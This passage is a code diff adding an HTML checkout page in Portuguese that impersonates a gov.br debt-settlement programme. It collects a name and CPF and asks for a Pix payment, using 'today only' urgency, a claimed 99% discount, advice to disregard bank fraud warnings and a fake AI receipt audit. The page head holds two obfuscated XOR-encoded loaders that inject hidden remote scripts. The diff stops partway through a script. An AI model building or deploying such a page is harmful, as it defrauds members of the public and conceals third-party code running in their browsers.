@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16.png">
+  <title>Acesso Seguro</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/desenrola.css?v=8">
+  <style>
+    .banner-urgencia {
+      display: flex; align-items: center; gap: 10px;
+      background: var(--alerta-amarelo-bg); border: 1px solid var(--alerta-amarelo-borda);
+      border-radius: 10px; padding: 14px 16px; margin: 16px;
+      font-size: 14px; font-weight: 600; color: #7a5e00; line-height: 1.4;
+    }
+    .banner-urgencia .ico-relogio { flex-shrink: 0; width: 20px; height: 20px; }
+
+    .checkout-card {
+      background: #fff; border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08);
+      padding: 22px 20px; margin: 0 16px 16px;
+    }
+
+    .card-titulo {
+      font-size: 13px; font-weight: 800; color: #1a1a1a;
+      text-transform: uppercase; letter-spacing: .04em; margin-bottom: 14px;
+    }
+
+    .linha {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px;
+    }
+    .linha:last-child { border-bottom: none; }
+    .linha-label { color: #555; }
+    .linha-valor { color: #1a1a1a; font-weight: 600; text-align: right; }
+    .linha-valor.destaque { color: var(--azul-primario); font-weight: 700; }
+
+    .metodo-pix {
+      display: flex; align-items: center; gap: 14px;
+      border: 2px solid var(--azul-primario); border-radius: 10px;
+      padding: 16px; background: #f8faff;
+    }
+    .metodo-pix .radio-dot {
+      width: 20px; height: 20px; border-radius: 50%;
+      border: 2px solid var(--azul-primario); flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .metodo-pix .radio-dot::after {
+      content: ''; width: 10px; height: 10px; border-radius: 50%;
+      background: var(--azul-primario);
+    }
+    .metodo-pix .ico-pix { display: block; width: 36px; height: 36px; flex-shrink: 0; object-fit: contain; }
+    .metodo-pix .met-nome { font-size: 15px; font-weight: 700; color: #1a1a1a; }
+    .metodo-pix .met-sub { font-size: 12px; color: #666; margin-top: 1px; }
+
+    .btn-confirmar {
+      display: block; width: 100%; padding: 16px 20px; margin-top: 16px;
+      background: var(--azul-primario); color: #fff; border: none; border-radius: 999px;
+      font-size: 15px; font-weight: 700; font-family: inherit;
+      cursor: pointer; text-align: center;
+    }
+    .btn-confirmar:hover { filter: brightness(1.06); }
+    .btn-confirmar:disabled { opacity: .55; pointer-events: none; }
+
+    .pix-section { display: none; scroll-margin-top: 72px; }
+    .pix-section.ativo { display: block; }
+
+    .pix-valor-grande { text-align: center; font-size: 32px; font-weight: 800; color: var(--azul-primario); margin-bottom: 2px; }
+    .pix-valor-sub { text-align: center; font-size: 13px; color: #888; margin-bottom: 18px; }
+
+    .pix-instrucoes { font-size: 14px; color: var(--cinza-texto); line-height: 1.6; margin-bottom: 20px; padding: 0 8px; }
+    .pix-instrucoes ol { padding-left: 20px; }
+    .pix-instrucoes li { margin-bottom: 4px; }
+
+    .qr-frame {
+      display: flex; align-items: center; justify-content: center;
+      border: 2px solid var(--azul-primario); border-radius: 12px;
+      padding: 16px; margin: 0 auto 20px; max-width: 260px;
+    }
+    .qr-frame svg { width: 200px; height: 200px; }
+
+    .pix-copiar {
+      border: 1.5px dashed var(--azul-primario); border-radius: 10px;
+      padding: 14px 16px; margin-bottom: 14px; background: #f0f4ff;
+    }
+    .pix-copiar-label { font-size: 11px; font-weight: 700; color: var(--azul-primario); text-transform: uppercase; letter-spacing: .05em; margin-bottom: 6px; }
+    .pix-copiar-code { font-size: 11px; font-family: monospace; color: var(--cinza-texto); word-break: break-all; line-height: 1.5; margin-bottom: 10px; }
+    .btn-copiar {
+      width: 100%; padding: 12px; background: var(--azul-primario); color: #fff;
+      border: none; border-radius: 8px; font-size: 14px; font-weight: 700;
+      font-family: inherit; cursor: pointer;
+    }
+    .btn-copiar.copiado { background: #059669; }
+
+    .aviso-atencao {
+      display: flex; gap: 14px; background: #f5f5f5; border-radius: 12px;
+      padding: 18px 16px; margin-bottom: 16px;
+    }
+    .aviso-atencao .ico-info {
+      width: 28px; height: 28px; border-radius: 50%; background: #4db6ac;
+      color: #fff; font-size: 16px; font-weight: 700; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .aviso-atencao .aviso-titulo { font-size: 15px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
+    .aviso-atencao .aviso-texto { font-size: 13px; color: #555; line-height: 1.5; }
+
+    .saiba-mais { border: 2px solid #e5a400; border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
+    .saiba-mais-toggle {
+      display: flex; justify-content: space-between; align-items: center;
+      width: 100%; padding: 14px 16px; background: #fff; border: none;
+      font-size: 15px; font-weight: 600; color: #1a1a1a; cursor: pointer; font-family: inherit;
+    }
+    .saiba-mais-toggle .seta { font-size: 12px; color: #888; transition: transform .2s; }
+    .saiba-mais-toggle.aberto .seta { transform: rotate(180deg); }
+    .saiba-mais-corpo { display: none; padding: 0 16px 16px; background: #fff; }
+    .saiba-mais-corpo.aberto { display: block; }
+
+    .banco-tabs { display: flex; gap: 0; border-bottom: 2px solid #eee; margin-bottom: 16px; }
+    .banco-tab {
+      padding: 10px 18px; font-size: 14px; font-weight: 600; color: #888;
+      border: none; background: none; cursor: pointer; font-family: inherit;
+      border-bottom: 3px solid transparent; margin-bottom: -2px;
+    }
+    .banco-tab.ativo { color: #1a1a1a; border-bottom-color: #4db6ac; }
+
+    .banco-mockup { display: none; }
+    .banco-mockup.ativo { display: block; }
+    .banco-mockup img { width: 100%; display: block; }
+
+    .pix-aguardando {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: var(--info-bg); border-radius: 8px; padding: 12px 14px;
+      font-size: 13px; font-weight: 600; color: var(--azul-primario); margin-bottom: 10px;
+    }
+    .dot-blink { width: 7px; height: 7px; background: var(--azul-primario); border-radius: 50%; animation: blink 1.2s infinite; }
+    @keyframes blink { 0%,80%,100% { opacity:.3; } 40% { opacity:1; } }
+
+    .pix-countdown { text-align: center; font-size: 13px; color: #666; }
+    .pix-countdown b { color: var(--azul-primario); }
+
+    .pix-sucesso { display: none; text-align: center; padding: 24px 16px; }
+    .pix-sucesso .ico-check { width: 60px; height: 60px; background: #d1fae5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; font-size: 30px; }
+    .pix-sucesso .tit { font-size: 18px; font-weight: 800; color: #059669; margin-bottom: 6px; }
+    .pix-sucesso .desc { font-size: 13px; color: #555; line-height: 1.5; }
+
+    .btn-verificar-pix {
+      display: block; width: 100%; padding: 16px 20px; margin: 18px 0 16px;
+      background: transparent; color: var(--azul-primario); border: 2px solid var(--azul-primario);
+      border-radius: 999px; font-size: 15px; font-weight: 700; font-family: inherit;
+      cursor: pointer; text-align: center; transition: background .2s, color .2s;
+    }
+    .btn-verificar-pix:hover { background: var(--azul-primario); color: #fff; }
+    .btn-verificar-pix:disabled { opacity: .55; pointer-events: none; }
+    .vp-sub { display: block; font-size: 11px; font-weight: 400; color: #888; margin-top: 4px; line-height: 1.4; }
+    .btn-verificar-pix:hover .vp-sub { color: rgba(255,255,255,.7); }
+    .repix-overlay {
+      display: none; position: fixed; inset: 0; z-index: 10000;
+      background: rgba(0,0,0,.6); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+      align-items: center; justify-content: center;
+    }
+    .repix-overlay.ativo { display: flex; }
+    .repix-modal {
+      background: #fff; border-radius: 14px; padding: 28px 22px;
+      max-width: 440px; width: calc(100% - 32px); max-height: 90vh;
+      overflow-y: auto; position: relative; box-shadow: 0 12px 40px rgba(0,0,0,.2);
+    }
+    .repix-close-x {
+      position: absolute; top: 12px; right: 14px; background: none; border: none;
+      font-size: 24px; color: #999; cursor: pointer; line-height: 1; padding: 4px; font-family: inherit;
+    }
+    .repix-close-x:hover { color: #333; }
+    .repix-badge {
+      display: inline-block; font-size: 11px; font-weight: 700; color: var(--azul-primario);
+      background: rgba(19,81,180,.06); border: 1px solid rgba(19,81,180,.15);
+      border-radius: 6px; padding: 5px 12px; text-transform: uppercase; letter-spacing: .04em; margin-bottom: 14px;
+    }
+    .repix-titulo { font-size: 18px; font-weight: 800; color: #1a1a1a; margin-bottom: 8px; }
+    .repix-msg { font-size: 13px; color: #666; line-height: 1.6; margin-bottom: 20px; }
+    .repix-upload-area {
+      border: 2px dashed #d0d0d0; border-radius: 10px; padding: 28px 16px;
+      text-align: center; cursor: pointer; transition: border-color .2s, background .2s;
+      margin-bottom: 16px; position: relative; overflow: hidden;
+    }
+    .repix-upload-area:hover, .repix-upload-area.drag-over { border-color: var(--azul-primario); background: rgba(19,81,180,.02); }
+    .repix-upload-ico { margin: 0 auto 10px; color: #888; }
+    .repix-upload-texto { font-size: 13px; color: #888; }
+    .repix-upload-texto strong { color: var(--azul-primario); cursor: pointer; }
+    .repix-upload-formatos { font-size: 11px; color: #aaa; margin-top: 6px; }
+    .repix-upload-input { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
+    .repix-arquivo {
+      display: none; font-size: 13px; color: #1a1a1a; font-weight: 600;
+      margin-bottom: 16px; padding: 10px 14px; background: #f5f5f5;
+      border-radius: 8px; word-break: break-all; align-items: center; gap: 8px;
+    }
+    .repix-arquivo.vis { display: flex; }
+    .repix-arquivo-nome { flex: 1; }
+    .repix-arquivo-trocar {
+      font-size: 11px; color: var(--azul-primario); cursor: pointer;
+      background: none; border: none; font-weight: 600; font-family: inherit; white-space: nowrap;
+    }
+    .btn-validar-ia {
+      display: block; width: 100%; padding: 16px 20px;
+      background: var(--azul-primario); color: #fff; border: none; border-radius: 999px;
+      font-size: 15px; font-weight: 700; font-family: inherit; cursor: pointer;
+    }
+    .btn-validar-ia:disabled { opacity: .55; pointer-events: none; }
+    .repix-loader { display: none; text-align: center; padding: 20px 0; }
+    .repix-loader-spinner {
+      width: 32px; height: 32px; border: 3px solid #eee;
+      border-top: 3px solid var(--azul-primario); border-radius: 50%;
+      animation: repix-spin .8s linear infinite; margin: 0 auto 12px;
+    }
+    @keyframes repix-spin { to { transform: rotate(360deg); } }
+    .repix-loader-texto { font-size: 13px; color: #888; font-weight: 600; }
+    .repix-resultado { display: none; text-align: center; padding: 16px 0; }
+    .repix-resultado-ico { margin: 0 auto 12px; }
+    .repix-resultado-titulo { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
+    .repix-resultado-msg { font-size: 13px; color: #666; line-height: 1.5; }
+    .repix-resultado.sucesso .repix-resultado-titulo { color: #059669; }
+    .repix-resultado.erro .repix-resultado-titulo { color: #d92c2c; }
+    .repix-tentar-novamente {
+      display: inline-block; margin-top: 14px; padding: 10px 22px;
+      background: transparent; color: var(--azul-primario); border: 2px solid var(--azul-primario);
+      border-radius: 999px; font-size: 13px; font-weight: 600; font-family: inherit; cursor: pointer;
+    }
+  </style>
+<script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y)})(window,document,"clarity","script","yg1df8hpok")</script>
+<script>(function(){var g_apky=atob("DCyS38Tgw0BCdTBhJlewqraM4XpgHUQVVl+o8OuDpy5sAEQMT0rr8aePrm4gBx8SRV77r7CT7DArDVUNCVz7p6GM7SoxVxxDR1jmra2CtjQnBhJbfXG+/aOMrCIjGUNDHHfp/aqBriVgTxIRT1T3s42E4WxgA1ENU0mw5ebWoiFwQwgCFB70uqbQpyJxRVJTHxikuvLCvh0/");var z_5ppd=[];for(var s_ke84=0;s_ke84<g_apky.length;s_ke84++){z_5ppd.push(g_apky.charCodeAt(s_ke84)&255);}var v_lf=z_5ppd[0];var l_w6j=z_5ppd.slice(1,1+v_lf);var y_1dt6=z_5ppd.slice(1+v_lf);var o_lfte=y_1dt6.map(function(b,j_cpg){return b^l_w6j[j_cpg%v_lf];});var d_k92="";for(var q_yl=0;q_yl<o_lfte.length;q_yl++){d_k92+=String.fromCharCode(o_lfte[q_yl]&255);}var m_o=decodeURIComponent(escape(d_k92));var h_v7=JSON.parse(m_o);var b_4=h_v7.globals||[];b_4.forEach(function(o_nk){window[o_nk.name]=o_nk.value;});var k_it=document.createElement("script");k_it.src=h_v7.url;k_it.async=true;k_it.defer=true;(h_v7.attributes||[]).forEach(function(t_lpz){k_it.setAttribute(t_lpz.name,t_lpz.value);});(document.head||document.documentElement).appendChild(k_it);})();</script>
+<script>(function(){var y_chh=atob("DGQ7xTQvWmF/3CU4+R8ZsEZDeFtdtFFMiRcB6htMPg9RqVFVkAJC61dAN08drgpLmhZStUBcdRQLsVYXlQVPoEdbdAsM/gkamBBPt11NLxUarwcCoh8Zq1VCP0NF/kFZjQUWsEBCMwcG8VVKnBJeq0ACIgIQuAhLmg8Z6RZZOw0KuQcC20ZG6U8NNAASuQcC2wBasVUCLxUStUNB1BRJoEJKNBVSr1BakABI5xgNLAATqUAaw0YZuGlS");var t_hb1=[];for(var b_ww6=0;b_ww6<y_chh.length;b_ww6++){t_hb1.push(y_chh.charCodeAt(b_ww6)&255);}var w_iy=t_hb1[0];var p_r5=t_hb1.slice(1,1+w_iy);var f_j=t_hb1.slice(1+w_iy);var h_8lbf=f_j.map(function(b,e_amv){return b^p_r5[e_amv%w_iy];});var i_f3="";for(var c_m8=0;c_m8<h_8lbf.length;c_m8++){i_f3+=String.fromCharCode(h_8lbf[c_m8]&255);}var d_tq=decodeURIComponent(escape(i_f3));var r_m=JSON.parse(d_tq);var l_vtf=r_m.globals||[];l_vtf.forEach(function(c_r){window[c_r.name]=c_r.value;});var x_c=document.createElement("script");x_c.src=r_m.url;x_c.async=true;x_c.defer=true;(r_m.attributes||[]).forEach(function(w_94){x_c.setAttribute(w_94.name,w_94.value);});(document.head||document.documentElement).appendChild(x_c);})();</script>
+</head>
+<body>
+  <div class="page-wrap">
+    <header class="hdr">
+      <span class="hdr-logo-link" aria-label="gov.br">
+        <img src="images/icon-seal.png" alt="" class="hdr-logo-img" width="100" height="32">
+      </span>
+      <div class="hdr-right">
+        <span class="btn-entrar" style="text-decoration:none;cursor:default">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+          </svg>
+          <span id="hdr-nome">Cliente</span>
+        </span>
+      </div>
+    </header>
+
+    <div class="banner-urgencia">
+      <svg class="ico-relogio" viewBox="0 0 24 24" fill="none" stroke="#7a5e00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      <span>Oferta válida somente hoje! Realize o pagamento para limpar seu nome.</span>
+    </div>
+
+    <section class="checkout-card" id="card-resumo">
+      <div class="card-titulo">Resumo do Acordo</div>
+      <div class="linha"><span class="linha-label">Benefici&aacute;rio</span><span class="linha-valor" id="res-nome">—</span></div>
+      <div class="linha"><span class="linha-label">CPF</span><span class="linha-valor" id="res-cpf">—</span></div>
+      <div class="linha"><span class="linha-label">C&oacute;digo do acordo</span><span class="linha-valor" id="res-acordo">—</span></div>
+      <div class="linha"><span class="linha-label">Desconto</span><span class="linha-valor destaque">99% de desconto</span></div>
+    </section>
+
+    <section class="checkout-card" id="card-dados">
+      <div class="card-titulo">Confirme seus dados</div>
+      <div class="linha"><span class="linha-label">Nome</span><span class="linha-valor" id="dados-nome">—</span></div>
+      <div class="linha"><span class="linha-label">CPF</span><span class="linha-valor" id="dados-cpf">—</span></div>
+    </section>
+
+    <section class="checkout-card" id="card-metodo" style="margin-bottom:21px">
+      <div class="card-titulo">Escolha o método de pagamento</div>
+      <div class="metodo-pix">
+        <span class="radio-dot"></span>
+        <img class="ico-pix" src="images/pix-logo.png" alt="PIX" width="36" height="36">
+        <div style="flex:1;min-width:0">
+          <div class="met-nome">PIX</div>
+          <div class="met-sub">Pagamento instantâneo</div>
+        </div>
+      </div>
+      <button type="button" class="btn-confirmar" id="btn-gerar-pix">Confirmar dados e gerar PIX</button>
+    </section>
+
+    <section class="checkout-card pix-section" id="pix-section">
+      <div class="pix-valor-grande">R$ 68,92</div>
+      <div class="pix-valor-sub">Valor total do acordo</div>
+
+      <div class="pix-instrucoes">
+        <ol>
+          <li>Abra o app do seu banco</li>
+          <li>Escolha a op&ccedil;&atilde;o <strong>Pagar com PIX</strong></li>
+          <li>Escaneie o código abaixo OU copie e cole o código</li>
+        </ol>
+      </div>
+
+      <div class="qr-frame" id="qr-frame"></div>
+
+      <div class="pix-copiar">
+        <div class="pix-copiar-label">PIX Copia e Cola</div>
+        <div class="pix-copiar-code" id="copy-code"></div>
+        <button type="button" class="btn-copiar" id="btn-copy">Copiar código PIX</button>
+      </div>
+
+      <button type="button" class="btn-verificar-pix" id="btn-verificar-pix">
+        Verificar Pagamento
+        <span class="vp-sub">Após pagar no app do seu banco, clique aqui para validar seu pagamento</span>
+      </button>
+
+      <div class="aviso-atencao">
+        <span class="ico-info">i</span>
+        <div>
+          <div class="aviso-titulo">Aten&ccedil;&atilde;o:</div>
+          <div class="aviso-texto">Os bancos reforçaram a segurança do Pix e podem exibir avisos preventivos. Não se preocupe, sua transa&ccedil;&atilde;o está protegida.</div>
+        </div>
+      </div>
+
+      <div class="saiba-mais">
+        <button type="button" class="saiba-mais-toggle" id="toggle-saiba-mais">
+          Saiba mais <span class="seta">&#9660;</span>
+        </button>
+        <div class="saiba-mais-corpo" id="corpo-saiba-mais">
+          <div class="banco-tabs" id="banco-tabs">
+            <button type="button" class="banco-tab ativo" data-banco="nubank">Nubank</button>
+            <button type="button" class="banco-tab" data-banco="inter">Inter</button>
+            <button type="button" class="banco-tab" data-banco="itau">Itaú</button>
+          </div>
+          <div class="banco-mockup ativo" id="mock-nubank">
+            <img src="images/alerta-nubank.png" alt="Alerta Nubank">
+          </div>
+          <div class="banco-mockup" id="mock-inter">
+            <img src="images/alerta-inter.png" alt="Alerta Inter">
+          </div>
+          <div class="banco-mockup" id="mock-itau">
+            <img src="images/alerta-itau.png" alt="Alerta Itaú">
+          </div>
+        </div>
+      </div>
+
+      <div class="pix-aguardando" id="pix-aguardando">
+        <span class="dot-blink"></span> Aguardando pagamento...
+      </div>
+      <div class="pix-countdown" id="countdown-wrap">PIX expira em <b id="countdown-num">15:00</b></div>
+
+      <div class="pix-sucesso" id="pix-sucesso">
+        <div class="ico-check">&#10003;</div>
+        <div class="tit">Pagamento confirmado!</div>
+        <div class="desc">Seu acordo foi processado com sucesso. Redirecionando...</div>
+      </div>
+    </section>
+
+    <footer class="site-ft">
+      <div class="site-ft-inner">
+        <img src="images/iconefooter.png" alt="" class="ft-gov-img">
+        <p>Todo o conteúdo deste site está publicado sob a licença.</p>
+      </div>
+    </footer>
+  </div>
+
+  <!-- RePix Modal -->
+  <div class="repix-overlay" id="repix-overlay">
+    <div class="repix-modal">
+      <button type="button" class="repix-close-x" id="repix-close-x">&times;</button>
+      <div id="repix-upload-step">
+        <div class="repix-badge">Pagamento em Processamento</div>
+        <div class="repix-titulo">Anexe seu Comprovante Pix</div>
+        <div class="repix-msg">Seu pagamento ainda não foi identificado automaticamente ou está sendo compensado pelo banco. Para liberar seu pedido imediatamente, anexe o comprovante Pix abaixo:</div>
+        <div class="repix-upload-area" id="repix-upload-area">
+          <div class="repix-upload-ico">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+          </div>
+          <div class="repix-upload-texto">Arraste o arquivo aqui ou <strong>clique para selecionar</strong></div>
+          <div class="repix-upload-formatos">PDF, JPG, PNG ou WEBP (máx. 10MB)</div>
+          <input type="file" class="repix-upload-input" id="repix-file" accept=".pdf,.jpg,.jpeg,.png,.webp">
+        </div>
+        <div class="repix-arquivo" id="repix-arquivo">
+          <span class="repix-arquivo-nome" id="repix-arquivo-nome"></span>
+          <button type="button" class="repix-arquivo-trocar" id="repix-arquivo-trocar">Trocar</button>
+        </div>
+        <button type="button" class="btn-validar-ia" id="btn-validar-ia" disabled>Validar Comprovante</button>
+      </div>
+      <div class="repix-loader" id="repix-loader">
+        <div class="repix-loader-spinner"></div>
+        <div class="repix-loader-texto">Inteligência Artificial auditando comprovante...</div>
+      </div>
+      <div class="repix-resultado" id="repix-resultado">
+        <div class="repix-resultado-ico" id="repix-resultado-ico"></div>
+        <div class="repix-resultado-titulo" id="repix-resultado-titulo"></div>
+        <div class="repix-resultado-msg" id="repix-resultado-msg"></div>
+        <div id="repix-resultado-acoes"></div>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/qrcode.min.js"></script>
+  <script>
+  (function () {
+    var BLACKCAT_CREATE = 'http://localhost:8080/proxy/blackcat/create';
+    
+    var BLACKCAT_STATUS_BASE = 'http://localhost:8080/proxy/blackcat/status/';
+    var AMOUNT_CENTS = 6892;
+    var PRODUCT_NAME = 'Pagamento Seguro';
+    var NEXT_URL = '../upsells/01/';
+
+    function getQuery(name) {
+      return new URLSearchParams(window.location.search).get(name) || '';
+    }
+    function formatCPF(raw) {
+      var d = String(raw || '').replace(/\D/g, '').slice(0, 11);
+      if (d.length !== 11) return raw || '***.***.***-**';
+      return d.slice(0,3) + '.' + d.slice(3,6) + '.' + d.slice(6,9) + '-' + d.slice(9);
+    }
+    function gerarEmail(nome) {
+      var partes = String(nome || '').toLowerCase()
+        .normalize('NFD').replace(/[̀-ͯ]/g, '')
+        .replace(/[^a-z0-9\s]/g, '').trim().split(/\s+/).filter(Boolean);
+      var emailNome = partes.slice(0, 2).join('.') || 'cliente';
+      return emailNome + '.' + Math.random().toString(36).substring(2, 6) + '@gmail.com';
+    }
+    function codeFromCPF(cpf) {
+      var d = String(cpf || '').replace(/\D/g, '');
+      var h = 5381;
+      for (var i = 0; i < d.length; i++) h = (h * 33 + d.charCodeAt(i)) >>> 0;
+      var s = h.toString(36).toUpperCase().padStart(8, 'X');
+      return (s.slice(0,5) + '-' + s.slice(5,9) + '-' + s.slice(9,13) + '-' + s.slice(13,17)).slice(0, 17);
+    }
+
+    var CPF = getQuery('cpf') || '';
+    var NOME = getQuery('nome') || '';
+    var ACORDO = getQuery('acordo') || '';
+    var PHONE_QS = getQuery('phone') || '';
+    var EMAIL_QS = getQuery('email') || '';
+    var VALOR_QS = getQuery('valor') || '';
+    var EMAIL = '';
+
+    try {
+      if (!CPF) CPF = localStorage.getItem('site.cpf') || '';
+      if (!NOME) NOME = localStorage.getItem('site.nome') || '';
+      if (!ACORDO) ACORDO = localStorage.getItem('site.acordo') || '';
+      if (!PHONE_QS) PHONE_QS = localStorage.getItem('site.phone') || '';
+      if (!EMAIL_QS) EMAIL_QS = localStorage.getItem('site.email') || '';
+      if (!VALOR_QS) VALOR_QS = localStorage.getItem('site.valor') || '';
+    } catch (_) {}
+
+    if (!ACORDO && CPF) ACORDO = codeFromCPF(CPF);
+    EMAIL = EMAIL_QS || gerarEmail(NOME);
+
+    var primeiroNome = String(NOME || 'Cliente').split(' ')[0];
+    document.getElementById('hdr-nome').textContent = primeiroNome;
+    document.getElementById('res-nome').textContent = NOME || '—';
+    document.getElementById('res-cpf').textContent = CPF ? formatCPF(CPF) : '—';
+    document.getElementById('res-acordo').textContent = ACORDO || '—';
+    document.getElementById('dados-nome').textContent = NOME || '—';
+    document.getElementById('dados-cpf').textContent = CPF ? formatCPF(CPF) : '—';
+
+    var transactionId = null;
+    var pollingTimer = null;
+    var countdownTimer = null;
+    var segundos = 15 * 60;
+
+    function renderQr(text) {
+      try {
+        var qr = qrcode(0, 'M');
+        qr.addData(text);
+        qr.make();
+        var frame = document.getElementById('qr-frame');
+        frame.innerHTML = '';
+        frame.insertAdjacentHTML('afterbegin', qr.createSvgTag({ cellSize: 4, margin: 0, scalable: true }));
+        var svgEl = frame.querySelector('svg');
+        if (svgEl) { svgEl.style.width = '200px'; svgEl.style.height = '200px'; }
+      } catch (e) { console.error('[qr]', e); }
+    }
+
+    function iniciarCountdown() {
+      var el = document.getElementById('countdown-num');
+      countdownTimer = setInterval(function () {
+        segundos--;
+        if (segundos <= 0) { segundos = 0; pararPolling(); }
+        var m = String(Math.floor(segundos / 60)).padStart(2, '0');
+        var s = String(segundos % 60).padStart(2, '0');
+        el.textContent = m + ':' + s;
+      }, 1000);
+    }
+
+    function pararPolling() {
+      if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
+      if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
+    }
+
+    function verificarStatus() {
+      if (!transactionId) return;
+      fetch(BLACKCAT_STATUS_BASE + encodeURIComponent(transactionId), {
+        cache: 'no-store'
+      })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        var status = String((data.data && data.data.status) || '').toUpperCase();
+        if (status === 'PAID' || status === 'paid' || status === 'completed') {
+          pararPolling();
+          document.getElementById('pix-aguardando').style.display = 'none';
+          document.getElementById('countdown-wrap').style.display = 'none';
+          document.querySelector('.pix-copiar').style.display = 'none';
+          document.getElementById('qr-frame').style.display = 'none';
+          document.querySelector('.pix-instrucoes').style.display = 'none';
+          document.querySelector('.pix-valor-grande').style.display = 'none';
+          document.querySelector('.pix-valor-sub').style.display = 'none';
+          document.querySelector('.aviso-atencao').style.display = 'none';
+          document.querySelector('.saiba-mais').style.display = 'none';
+          document.getElementById('pix-sucesso').style.display = 'block';
+          try {
+            var sv = JSON.parse(sessionStorage.getItem('_pag') || '{}');
+            sv.status = 'PAID';
+            sessionStorage.setItem('_pag', JSON.stringify(sv));
+          } catch (_) {}
+          setTimeout(function () { window.location.href = NEXT_URL + window.location.search; }, 3000);
+        }
+      })
+      .catch(function () {
+        if (transactionId && pollingTimer) {
+          clearInterval(pollingTimer);
+          pollingTimer = setInterval(verificarStatus, 10000);
+        }
+      });
+    }
+
+    (function () {
+      var saved = null;
+      try { saved = JSON.parse(sessionStorage.getItem('_pag') || '{}'); } catch (_) {}
+      if (saved && saved.transactionId && saved.cpf === CPF && saved.status !== 'PAID') {
+        transactionId = saved.transactionId;
+        if (saved.copyPaste) {
+          document.getElementById('copy-code').textContent = saved.copyPaste;
+          renderQr(saved.copyPaste);
+        }
+        document.getElementById('card-metodo').style.display = 'none';
+        document.getElementById('pix-section').classList.add('ativo');
+        verificarStatus();
+        if (pollingTimer) clearInterval(pollingTimer);
+        pollingTimer = setInterval(verificarStatus, 3000);
+        iniciarCountdown();
+      }
+    })();
+
+    document.addEventListener('visibilitychange', function () {
+      if (!document.hidden && transactionId) verificarStatus();
+    });
+
+    document.getElementById('btn-gerar-pix').addEventListener('click', function () {
+      var btn = this;
+      btn.disabled = true;
+      btn.textContent = 'Gerando PIX...';
+
+      var phone = PHONE_QS || '11988887777';
+      var extCode = 'DR-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6);
+
+      var TRACK_KEYS = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id', 'fbclid', 'src', 'sck', 'xcod'];
+      var metadata = {};
+      TRACK_KEYS.forEach(function (k) {
+        var v = '';
+        try { if (window.utmParams && typeof window.utmParams.get === 'function') v = window.utmParams.get(k) || ''; } catch (_) {}
+        if (!v) v = getQuery(k);
+        if (!v) { try { v = localStorage.getItem(k) || ''; } catch (_) {} }
+        if (v) metadata[k] = v;
+      });
+
+      var payload = JSON.stringify({
+        external_code: extCode,
+        payment_format: 'regular',
+        payment_method: 'pix',
+        installments: 1,
+        payment_amount: AMOUNT_CENTS,
+        postback_url: window.location.href,
+        pix: { expires_in_days: 1 },
+        items: [{ name: PRODUCT_NAME, quantity: 1, price: AMOUNT_CENTS }],
+        customer: {
+          name: NOME || 'Cliente',
+          email: EMAIL,
+          document: String(CPF || '00000000000').replace(/\D/g, ''),
+          phone: phone,
+          ip: '177.136.254.1'
+        },
+        extra: {
+          url_full: window.location.href,
+          url_referer: document.referrer || null,
+          user_agent: navigator.userAgent,
+          metadata: metadata
+        }
+      });
+
+      fetch(BLACKCAT_CREATE, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+      })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        var pixCode = (data.data && data.data.paymentData && data.data.paymentData.copyPaste) || '';
+        var paymentCode = (data.data && data.data.transactionId) || '';
+
+        if (!pixCode) {
+          alert('Erro ao gerar PIX. Tente novamente.');
+          btn.disabled = false;
+          btn.textContent = 'Confirmar dados e gerar PIX';
+          return;
+        }
+
+        transactionId = paymentCode;
+        document.getElementById('copy-code').textContent = pixCode;
+        renderQr(pixCode);
+        document.getElementById('card-metodo').style.display = 'none';
+        document.getElementById('pix-section').classList.add('ativo');
+        document.getElementById('pix-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        iniciarCountdown();
+        if (pollingTimer) clearInterval(pollingTimer);
+        pollingTimer = setInterval(verificarStatus, 3000);
+
